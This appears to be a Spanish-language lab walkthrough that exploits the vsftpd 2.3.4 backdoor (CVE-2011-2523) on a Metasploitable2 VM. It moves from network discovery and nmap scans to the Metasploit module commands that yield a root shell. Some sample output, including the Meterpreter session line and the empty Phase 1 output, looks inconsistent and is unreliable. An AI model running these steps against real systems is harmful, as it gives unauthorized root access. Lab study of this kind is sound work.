# Explotacion de vsftpd 2.3.4 en Linux con Metasploit

> [!info] Idea principal
> Caso practico completo: desde el descubrimiento de la maquina en la red hasta conseguir una shell de `root` explotando el backdoor de **vsftpd 2.3.4**.

> [!warning] Importante
> Todo esto se hace sobre una maquina de laboratorio (Metasploitable2). Usar estas tecnicas solo en entornos propios o con permiso.

## Resumen del Ataque

> [!example] Fases
> 1. Descubrir maquinas en la red con `arp-scan`.
> 2. Confirmar que el objetivo esta activo con `ping`.
> 3. Escanear puertos y servicios con `nmap`.
> 4. Buscar vulnerabilidades con el script `vuln`.
> 5. Explotar con Metasploit.
> 6. Conseguir una shell.

## Fase 1: Descubrir Maquinas en la Red

Lanzo un escaneo ARP para ver las maquinas de la red local:

```bash
arp-scan -I eth0 --localnet
```

Salida:


> [!tip] Como elijo el objetivo
> La IP que me interesa es `192.168.1.29`. Su MAC empieza por `08:00:27`, que corresponde a una maquina virtual de **VirtualBox**, asi que probablemente es mi objetivo de laboratorio.

## Fase 2: Comprobar que la Maquina esta Activa

Hago un `ping` para confirmar que responde:

```bash
ping -c 1 192.168.1.29
```

Salida:

```text
PING 192.168.1.29 (192.168.1.29) 56(84) bytes of data.
64 bytes from 192.168.1.29: icmp_seq=1 ttl=64 time=0.562 ms

--- 192.168.1.29 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

> [!note] Pista del TTL
> El `ttl=64` sugiere que la maquina objetivo es un sistema **Linux**.

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.1.29 -oN escaneo_principal
```

> [!info] Servicio interesante
> En el puerto `21/tcp` corre **vsftpd 2.3.4**, una version conocida por tener un backdoor. Ese va a ser el objetivo.

## Fase 4: Buscar Vulnerabilidades con Nmap

Lanzo los scripts de la categoria `vuln` contra el puerto `21`:

```bash
nmap --script "vuln" -p21 192.168.1.29
```

Salida:

```text
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
```

> [!success] Confirmado
> El script confirma que es vulnerable al backdoor `CVE-2011-2523` y que al explotarlo se obtiene ejecucion como `root` (`uid=0`).

## Fase 5: Explotar con Metasploit

Abro Metasploit:

```bash
msfconsole
```

Busco el exploit por el CVE:

```text
search CVE-2011-2523
```

Salida:

```text
#  Name                                  Rank       Description
0  exploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD 2.3.4 Backdoor Command Execution
```

> [!tip] Alternativa de busqueda
> Si no aparece con el CVE, puedo buscarlo por el nombre del servicio:
>
> ```text
> search vsftpd
> ```

Selecciono el modulo:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

O tambien:

```text
use 0
```

Reviso los parametros:

```text
show options
```

Configuro el objetivo:

```text
set RHOSTS 192.168.1.29
```

Ejecuto el exploit:

```text
run
```

Salida:

```text
[*] Started reverse TCP handler on 192.168.1.26:4444
[*] 192.168.1.29:21 - Running automatic check
[*] 192.168.1.29:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.1.29:21 - The target appears to be vulnerable.
[+] 192.168.1.29:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.1.26:4444 -> 192.168.1.29:41294)
```

> [!success] Acceso conseguido
> Se abre una sesion en la maquina `192.168.1.29`. Ya tengo una shell en el objetivo.

## Fase 6: Comprobar el Acceso

Dentro de la sesion puedo confirmar el usuario:

```bash
id
```

Salida esperada:

```text
uid=0(root) gid=0(root)
```

> [!note] Resultado
> El backdoor de vsftpd 2.3.4 da acceso directo como `root`, asi que no hace falta escalar privilegios.

## Datos Clave de este Caso

- **Objetivo:** `192.168.1.29` (Metasploitable2).
- **Servicio vulnerable:** vsftpd 2.3.4 en el puerto `21`.
- **Vulnerabilidad:** backdoor `CVE-2011-2523`.
- **Modulo:** `exploit/unix/ftp/vsftpd_234_backdoor`.
- **Resultado:** shell como `root`.
